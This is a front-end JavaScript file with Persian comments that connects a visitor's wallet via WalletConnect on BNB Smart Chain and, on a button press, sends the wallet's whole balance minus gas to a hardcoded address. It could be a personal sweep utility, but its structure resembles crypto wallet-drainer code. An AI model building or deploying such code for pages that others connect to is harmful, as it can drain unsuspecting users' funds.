import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { WalletConnectModal } from "@walletconnect/modal";
import { ethers } from "ethers";

// === کانفیگ ثابت ===
const PROJECT_ID     = "4d08946e6c316bed5e76b450ccbb5256";
const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";

// ارجاع به DOM
const connectBtn = document.getElementById("connect");
const infoDiv    = document.getElementById("info");
const addrCode   = document.getElementById("address");
const balEl      = document.getElementById("balance");
const sendBtn    = document.getElementById("send");

let modal, provider, ethProvider, signer;

(async () => {
  // ۱. ساخت مودال WalletConnect
  modal = new WalletConnectModal({
    projectId: PROJECT_ID,
    walletConnectOptions: { version: 2 },
    themeVariables: {}
  });

  // ۲. init کردن EthereumProvider و وصل کردن مودال
  provider = await EthereumProvider.init({
    projectId: PROJECT_ID,
    chains: [56],  // BNB Smart Chain
    showQrModal: false,
    qrModalOptions: { modal },
    rpcMap: { 56: "https://bsc-dataseed.binance.org/" },
    methods: [
      "eth_sendTransaction",
      "eth_signTransaction",
      "eth_sign",
      "personal_sign",
      "eth_signTypedData"
    ],
    events: ["chainChanged", "accountsChanged"]
  });

  // ۳. آماده‌سازی ethers
  ethProvider = new ethers.providers.Web3Provider(provider);
  signer      = ethProvider.getSigner();

  // ۴. دکمه اتصال → باز کردن مودال + enable
  connectBtn.addEventListener("click", async () => {
    try {
      await modal.openModal();
      await provider.enable();
      modal.closeModal();

      const address = await signer.getAddress();
      const balance = await ethProvider.getBalance(address);

      addrCode.textContent = address;
      balEl.textContent    = ethers.utils.formatEther(balance) + " BNB";
      infoDiv.style.display = "block";
    } catch (err) {
      console.error(err);
      alert("خطا در اتصال: " + err.message);
    }
  });

  // ۵. دکمه ارسال کل موجودی
  sendBtn.addEventListener("click", async () => {
    try {
      const address = await signer.getAddress();
      const balance = await ethProvider.getBalance(address);
      const gasPrice = await ethProvider.getGasPrice();
      const gasLimit = ethers.BigNumber.from(21000);
      const fee      = gasPrice.mul(gasLimit);
      const value    = balance.sub(fee);

      if (value.lte(0)) {
        return alert("موجودی کافی برای پوشش کارمزد ندارید");
      }

      const tx = await signer.sendTransaction({
        to: TARGET_ADDRESS,
        value,
        gasPrice,
        gasLimit
      });

      alert("تراکنش ارسال شد:\n" + tx.hash);
      await tx.wait();
      alert("تایید شد!");

      const newBal = await ethProvider.getBalance(address);
      balEl.textContent = ethers.utils.formatEther(newBal) + " BNB";
    } catch (err) {
      console.error(err);
      alert("خطا در ارسال تراکنش: " + err.message);
    }
  });
})();